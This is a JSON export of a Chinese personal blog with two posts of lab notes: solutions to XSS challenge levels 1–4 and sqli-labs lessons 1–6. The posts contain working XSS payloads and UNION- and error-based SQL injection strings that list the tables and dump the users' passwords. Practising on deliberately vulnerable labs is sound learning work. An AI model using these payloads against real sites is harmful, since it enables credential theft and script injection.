{"meta":{"title":"FINSENTY54","subtitle":"你看那云聚了又散，散了又聚","description":"blog","author":"finsenty54","url":"http://finsenty54.github.io","root":"/"},"pages":[{"title":"","date":"2019-02-27T03:27:47.653Z","updated":"2019-02-27T03:23:58.180Z","comments":true,"path":"googleda09d6ee39745173.html","permalink":"http://finsenty54.github.io/googleda09d6ee39745173.html","excerpt":"","text":"google-site-verification: googleda09d6ee39745173.html"}],"posts":[{"title":"XSS 20关挑战","slug":"xss","date":"2019-03-01T22:22:42.000Z","updated":"2019-03-03T03:49:34.825Z","comments":true,"path":"2019/03/02/xss/","link":"","permalink":"http://finsenty54.github.io/2019/03/02/xss/","excerpt":"","text":"level1反射型XSS也被称为非持久性CSS当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。 alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。 查看源码window.alert = function()echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;没有过滤直接调用函数就可以通关&lt;script&gt;window.alert()&lt;/script&gt; &lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。 less2利用页面元素看到输入在&lt;input name=keyword value=&quot;&#39;.$str.&#39;&quot;&gt;闭合input语句即可1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot; less3查看页面元素&lt;input name=keyword value=&#39;1&#39;&gt;在input语句里尝试闭合无用查看源码str都加上了htmlspecialchars函数，但默认配置是不过滤单引号的&#39;onmouseover=&#39;window.alert()即可 输入&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;输入&#39;&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;输入&#39;onclick&#39; &lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;输入onclick= &lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt; less4输入&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;查看可知&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;过滤了&lt; &gt;利用上节方法&quot;onclick=&quot;alert() 更新于2019-03-03 11:19:50 星期日","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"http://finsenty54.github.io/tags/xss/"}]},{"title":"sqli-labs","slug":"sqli-labs","date":"2019-02-26T17:01:08.000Z","updated":"2019-03-03T03:49:35.915Z","comments":true,"path":"2019/02/27/sqli-labs/","link":"","permalink":"http://finsenty54.github.io/2019/02/27/sqli-labs/","excerpt":"","text":"Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata 在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &quot;&lt;br&gt;&quot;; 表示换行 ?id=1&#39; and 1=1 --+ 没有报错，返回正确结果 ?id=10&#39; 报错 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1 ?id=1&#39; and 1=2 --+ 没有正确结果经过这三个步骤说明是字符型注入 使用order by来判断有几个字段?id=1&#39; order by 4--+报错Unknown column &#39;4&#39; in &#39;order clause&#39;说明有3个字段 LIMIT 0,1 表示结果只显示一行?id=-1&#39; union select 1,2,3 --+ 看哪个字段可以回显 ?id=1&#39; union select 1,concat_ws(&#39;_&#39;,version(),user(),database()),@@basedir --+得到版本，用户，当前数据库，数据路径concat_ws 带分隔符的链接 ?id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema = database() --+得到当前库的表名?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 --+查看数据库名信息group_concat 行转列 ?id=-1 &#39; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;), 3 --+users 表的列名 ?id=-1 &#39; union select 1,(select group_concat(password) from users) ,3 --+得出账户密码 Less-2 ?id=1&#39;报错 ?id=1 and 1=1正确 ?id=1 and 1=2错误可知是数字型注入解题与第一题类似，不再赘述 Less-3查看源码可知，用()加在了id两边，所以只要将()闭合就行了?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3--+?id=-1&#39;) union select 1,(select group_concat(password) from users),3--+ Less-4查看源码，id两边加了”,用?id=-1&quot;)闭合 Less-5双注入 Rand() //随机函数 Floor() //取整函数 Count() //汇总函数 Group by clause //分组语句 https://blog.csdn.net/Leep0rt/article/details/78556440 ?id=1&#39; union select count(*),1,concat((select database()), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+select 查询列数要相同，否则报错 ?id=1&#39; union select count(*),1,concat((select password from users limit 5,1), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+用group_concat会报错，使用limit 更新于2019-03-01 22:21:15 星期五 Less-6尝试注入后可知是用&quot;闭合，字符串型其他和上题一致?id=1&quot; union select count(*),concat( (select user()),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select table_name from information_schema.tables where table_schema=database() limit 3,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 5,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ ?id=1&quot; union select count(*),concat( (select password from users limit 0,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+ 更新于2019-03-03 11:48:51 星期日","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"http://finsenty54.github.io/tags/sql/"}]}]}